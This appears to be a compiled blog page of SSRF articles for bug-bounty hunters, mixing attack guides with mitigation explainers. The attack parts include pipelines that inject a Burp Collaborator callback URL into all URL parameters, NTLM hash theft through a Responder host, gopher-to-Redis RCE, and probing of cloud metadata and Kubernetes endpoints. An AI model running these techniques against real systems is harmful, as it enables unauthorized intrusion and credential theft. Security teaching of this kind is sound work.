Today is Bug bounty Tuesday, I will share with you about how use 6 step to find ssrf in bug bounty.

So, let's dive right in.

None
Image generated with PaintingForYou
Step 1: Subdomain Enumeration
DNS Dumpster
Sublist3r
Amass
Google Dorking
Certificate Transparency Logs
subdomainer
Step 2: Find Live Domains
Copy
cat all-domains.txt | httpx > all-live.txt
Step 3: Identify All URLs
Copy
cat all-live.txt | gauplus -subs -b png,jpg,gif,jpeg,swf,woff,gif,svg -o allUrls.txt
Step 4: Injection Burp Collaborator URL in Parameters
Copy
cat httpx.txt | grep "=" | ./qsreplace http://40ga7gynfy6pcg06ov.oastify.com > ssrf.txt
Step 5: Test for SSRF Vulnerabilities
Copy
cat ssrf.txt | httpx -fr
Step 6: How to check which URL is vulnerable
Copy
split -l 10 ssrf.txt output_file_





1. Try other URL schemes:
• file:// (file read)

• netdoc:// (file read)

• dict://

• gopher://

• jar://

• ldap://

You might be able to get file read.

Or send multi-line requests to gain additional impact

(Ex: gopher + redis = likely RCE)

2. Is the target running Windows?
Can't hit internal services?

(Well, try this even if you can)

Try to steal NTLM hashes with Responder.

/vulnerable?url=http://your-responder-host

3. Try alternative representations of IP addresses.
IPs can be represented in many ways including:

• octal

• decimal

• hexadecimal

• etc.

Try different representations.

4. Can't hit 169.254.169.254?
On AWS, "instance-data" resolves to the metadata server.

Try hitting http://instance-data instead.

5. Know your target's technologies.
Look at job postings!

You might not be able to hit a meta-data service.

But there are likely other internal services!

(ex: I've pulled data from an internal Elasticsearch instance)

6. Are they using Kubernetes?
Search Burp history for ".default.svc" or ".cluster.local"

If you find references, try to hit them.

Also, try to hit the Kubernetes API: https://kubernetes.default.svc

7. In Kubernetes, you should be brute-forcing for:
`HOSTNAME.<some-namespace>.svc.cluster.local`

I often use Burp Intruder: FUZZ.default.svc.cluster.local

Need better wordlists?

Scrape helm charts from ArtifactHub.

8. Can't supply a full URL? You can still get SSRF!
If your input is used to build a URL, THINK.

Learn about URL structures.

The following 4 characters have led to many SSRFs:

• @

• ?

• #

• ;

9. If your injection is down the path, traverse!
GET /vulnerable?id=1234

app fetches: http://some-api/api/v1/1234
GET /vulnerable?id=../../

app fetches: http://some-api/api/v1/../../
Find an open redirect & you probably have SSRF.

Or likely can hit internal endpoints.


Server-Side Request Forgery (SSRF) is an often-overlooked but highly dangerous vulnerability in web applications. It allows attackers to…
Land2Cyber
Land2Cyber

Follow
androidstudio
·
June 16, 2024 (Updated: June 16, 2024)
·
Free: No
Server-Side Request Forgery (SSRF) is an often-overlooked but highly dangerous vulnerability in web applications. It allows attackers to make requests from the server-side of an application to internal or external resources that the attacker would not normally have access to. This article explores SSRF in detail, explaining how it works, the potential impacts, and effective strategies for mitigation.

What is Server-Side Request Forgery (SSRF)?
SSRF is a vulnerability that occurs when an attacker can manipulate a server into making unintended requests to arbitrary locations, which can be internal services, external servers, or other parts of the network. The attacker achieves this by exploiting the server's functionality to send crafted requests, often leading to unauthorized access to sensitive information or further network exploitation.

How SSRF Works
SSRF attacks typically exploit web applications that accept user input and use it to fetch resources from another server without proper validation or sanitization. Here's a basic example to illustrate the concept:

User Input → The web application accepts a URL as user input, intending to fetch content from that URL.
Crafted Request → An attacker submits a crafted URL pointing to an internal service (e.g., http://localhost/admin).
Server Request → The server, trusting the user input, makes a request to the specified URL.
Response → The attacker gains access to internal information or services that should not be accessible externally.
Common SSRF Attack Scenarios
Accessing Internal Services → An attacker can access internal services that are not exposed to the public internet, such as internal APIs, databases, or administrative interfaces.
Bypassing Firewall Rules → SSRF can be used to bypass network restrictions, allowing attackers to access restricted network segments.
Sensitive Data Exposure → SSRF can lead to the exposure of sensitive data such as metadata, credentials, and configuration files by querying internal services like AWS metadata endpoints.
Port Scanning → Attackers can use SSRF to scan internal networks, discovering open ports and services for further exploitation.
Impact of SSRF Attacks
The impact of SSRF attacks can be severe, depending on the specific scenario and the resources accessible to the compromised server. Potential consequences include

Data Breaches → Unauthorized access to sensitive data stored on internal services.
System Compromise → Gaining control over internal systems and networks, potentially leading to a full-scale breach.
Service Disruption → Causing denial of service by overwhelming internal services with malicious requests.
Financial Loss → Incurring financial damage due to data breaches, regulatory fines, and the cost of remediation.
Mitigating SSRF Vulnerabilities
Preventing SSRF attacks requires a combination of secure coding practices, proper configuration, and regular security assessments. Here are some effective strategies

1. Input Validation and Sanitization
Whitelist Valid URLs → Implement a whitelist of acceptable URLs or domains that the application is allowed to request. Reject any input that does not match the whitelist criteria.
URL Parsing → Properly parse and validate URLs to ensure they do not point to internal services or private IP ranges.
2. Network Segmentation
Restrict Internal Services → Isolate sensitive internal services and restrict their access to only necessary internal systems. Use firewalls and access control lists to limit exposure.
Use Private Networks → Deploy internal services on private networks that are not accessible from the internet or untrusted segments.
3. Implement Security Controls
Authentication and Authorization → Ensure that internal services require proper authentication and authorization before granting access.
Rate Limiting → Apply rate limiting to mitigate the risk of automated attacks and limit the impact of SSRF attempts.
4. Regular Security Audits
Penetration Testing → Conduct regular penetration testing to identify and address potential SSRF vulnerabilities.
Code Reviews → Perform security-focused code reviews to catch potential SSRF issues during the development process.
5. Use Security Libraries and Frameworks
Security Libraries → Leverage security libraries and frameworks that provide built-in protection against common web vulnerabilities, including SSRF.
Server-Side Request Forgery (SSRF) is a critical vulnerability that can lead to significant security breaches if left unaddressed. Understanding how SSRF works and implementing robust security measures is essential to protect web applications and the sensitive data they handle. By adopting best practices for input validation, network segmentation, and regular security assessments, organizations can mitigate the risk of SSRF attacks and enhance their overall security posture.



Unveiling Server-Side Request Forgery (SSRF) Understanding the Threat and Fortifying Your Defenses
in the realm of cybersecurity, Server-Side Request Forgery (SSRF) represents a formidable threat to web applications and servers. This…
Land2Cyber
Land2Cyber

Follow
androidstudio
·
March 25, 2024 (Updated: March 26, 2024)
·
Free: No
in the realm of cybersecurity, Server-Side Request Forgery (SSRF) represents a formidable threat to web applications and servers. This attack vector exploits vulnerabilities in web applications to manipulate server-side requests, potentially leading to unauthorized access, data leaks, or even complete system compromise. In this article, we'll delve into the intricacies of SSRF, explore real-world examples, and discuss effective strategies to mitigate this pervasive threat.

Understanding Server-Side Request Forgery (SSRF)

Server-Side Request Forgery (SSRF) is a type of web application vulnerability that enables attackers to manipulate server-side requests initiated by the targeted application. SSRF attacks typically occur when an application processes user-supplied input to make HTTP requests to arbitrary destinations, allowing attackers to control the destination and parameters of these requests.

How SSRF Works

SSRF attacks exploit the trust relationship between a web application and the server it resides on. By submitting crafted input, such as URLs or IP addresses, attackers can trick the application into making unintended requests to internal resources, third-party services, or even the server itself. This manipulation can have severe consequences, including data exfiltration, reconnaissance, or remote code execution.

Real-World Examples of SSRF

Data Exfiltration → An attacker leverages SSRF to access sensitive data stored on internal network resources, such as databases or file servers, and exfiltrates it to an external destination controlled by the attacker.
Remote Code Execution → By exploiting SSRF vulnerabilities, attackers can force the server to make requests to maliciously crafted URLs containing payloads that trigger remote code execution, leading to full compromise of the server.
Cloud Metadata Abuse → In cloud environments, SSRF can be used to access sensitive metadata endpoints or control infrastructure resources, potentially leading to unauthorized access or resource manipulation.
Mitigation Strategies for SSRF

Protecting against SSRF requires a multi-layered approach that encompasses secure coding practices, network configurations, and runtime defenses. Here are some effective strategies to mitigate the risk of SSRF

Input Validation and Whitelisting
Validate User Input → Sanitize and validate all user-supplied input, especially URLs or IP addresses, to prevent injection of malicious payloads
Implement Whitelists → Restrict the destinations and protocols allowed by the application to ensure that only trusted resources can be accessed.
2. Use of Safe APIs and Libraries

Utilize Safe APIs → Preferentially use high-level APIs and libraries that provide built-in protection against SSRF, such as the Java URL Connection class with URL whitelisting.
Avoid User-Controlled URLs → Refrain from making requests to URLs constructed from user-controlled input, as this can inadvertently introduce SSRF vulnerabilities.
3. Network Segmentation and Access Controls

Segment Internal Resources → Isolate sensitive internal resources from external access and enforce strict access controls to prevent unauthorized requests.
Use Network Firewalls → Deploy network firewalls to restrict outbound traffic from the server and block requests to potentially risky destinations.
4. Monitor and Log Server Activity

Enable Server Logging → Log all outgoing requests made by the application, including destination URLs, parameters, and response codes, to facilitate detection and investigation of SSRF attacks.
Implement Intrusion Detection Systems (IDS) → Deploy IDS solutions capable of detecting anomalous or suspicious network activity indicative of SSRF attacks in real-time.
Server-Side Request Forgery (SSRF) poses a significant risk to web applications and servers, allowing attackers to manipulate server-side requests for malicious purposes. By understanding the underlying mechanisms of SSRF attacks and implementing robust mitigation strategies, organizations can fortify their defenses against this pervasive threat. Secure coding practices, rigorous input validation, network segmentation, and continuous monitoring are essential components of a comprehensive defense strategy to safeguard against SSRF and other evolving cyber threats in today's digital landscape.



In-Depth Analysis of Server-Side Request Forgery (SSRF) Vulnerabilities
Server-Side Request Forgery (SSRF) is a cunning adversary that manipulates a web application's trust in making requests to internal…
Land2Cyber
Land2Cyber

Follow
androidstudio
·
February 2, 2024 (Updated: February 3, 2024)
·
Free: No
Server-Side Request Forgery (SSRF) is a cunning adversary that manipulates a web application's trust in making requests to internal resources. As the digital landscape expands, so does the prevalence and sophistication of SSRF attacks. In this article, we embark on a journey to dissect the intricacies of SSRF vulnerabilities, exploring their mechanisms, potential impacts, detection methods, and strategies for mitigation.

Understanding SSRF: The Silent Threat
1. Unveiling the Mechanics of SSRF
Defining SSRF and exploring how it operates.
Differentiating between blind and direct SSRF attacks.
Recognizing the role of input validation in SSRF vulnerabilities.
2. The Spectrum of Impact
Analyzing the potential consequences of SSRF exploits.
Demonstrating data exfiltration and unauthorized access.
Highlighting the importance of understanding target architecture.
Identifying SSRF Vulnerabilities
1. Automated Scanning Techniques
Leveraging tools like Burp Suite and OWASP Amass for SSRF detection.
Analyzing HTTP responses for potential SSRF indicators.
Identifying common URL parsing and validation issues.
2 . Manual Testing Approaches
Examining input fields and parameters for SSRF susceptibility.
Utilizing crafted payloads to provoke SSRF behavior.
Employing various protocols (file, gopher, etc.) for diverse attack scenarios.
Exploitation and Advanced Techniques
1. Exploiting SSRF for Information Gathering
Retrieving sensitive metadata from internal services.
Exploiting SSRF for port scanning and network reconnaissance.
Demonstrating how SSRF can be a stepping stone for further attacks.
2. Bypassing Filters and Protections
Evading common SSRF protection mechanisms.
Using advanced techniques like protocol smuggling.
Discussing challenges and countermeasures in filter evasion.
Mitigation Strategies
1. Input Validation and Whitelisting
Implementing robust input validation to prevent SSRF.
Utilizing whitelists for allowed protocols, domains, and IP addresses.
Securing the application against user-controlled input.
2. Network Isolation and Least Privilege
Restricting network access to minimize potential impact.
Employing network segmentation and firewall rules.
Emphasizing the principle of least privilege for server-side processes.
As the threat landscape continues to evolve, so must our understanding of vulnerabilities like SSRF. By undertaking an in-depth analysis of SSRF vulnerabilities, developers, security professionals, and bug bounty hunters can fortify their applications against this silent but potent threat. This article serves as a comprehensive guide to navigating the complex world of SSRF, empowering security enthusiasts to protect sensitive data, maintain system integrity, and contribute to a more secure digital environment. Stay vigilant, stay secure. Happy reading!



How I Automatically Discovered SSRF in Hackerone Program
Hi guys, I am Kerstan. Today, I will share you how I automatically discoverd SSRF on hackerone Program.
kerstan
kerstan

Follow
androidstudio
·
December 15, 2023 (Updated: December 24, 2023)
·
Free: No
Finding a blind SSRF is relatively easy, but to earn more bounty, you need to exploit it and gain more access. It requires relentless effort. Try harder, bro!

If this writing has been helpful to you, please consider giving it a clap and following. Thanks bro.

So, let's get started.

None
1. Download & Install
First, you need to download AutoRepeater from the following address. Once downloaded, go to the Extender interface of Burp and import AutoRepeater.jar.

https://github.com/nccgroup/AutoRepeater
https://github.com/nccgroup/AutoRepeater
2. Automatically Discovered SSRF
You need to do two preparatory steps:

You need a dnslog platform where you can view the logs, such as Burp's Collaborator or ceye.io. You can also use other platforms.
You need to prepare the following two regular expressions.
Copy
(?i)^(https|http|file)://.*
(?i)^(https|http|file)%3A%2F%2F.*
Let's explain the two regular expressions briefly:

The first regular expression ensures that unencoded URLs can be matched correctly.

The second regular expression ensures that encoded URLs can be matched correctly.

They are used to match URLs and replace them with dnslog addresses, and then automatically send the requests.

So, all we need to do is check if there is any data on the DNS log platform or test all the endpoints that carry URLs to determine if there is an SSRF vulnerability.

In my experience, any place that carries SSRF has the potential for an SSRF. It is recommended to test all of them.

Now, let's configure the rules for AutoRepeater.

None
None
Once you have configured everything as mentioned above, you just need to click here to start waiting for dnslog data. You can browse any page or test any endpoint you need in your browser.

None
If you find records similar to the following on your DNS log platform, Congratulations, you are about to obtain an SSRF.

None
3. Blind SSRF
When you discover a blind SSRF, you should test it using all available methods, such as fuzzing parameters, and never give up, bro.

If you want to learn about the approach to discovering SSRF, you can check out my previous writing.

None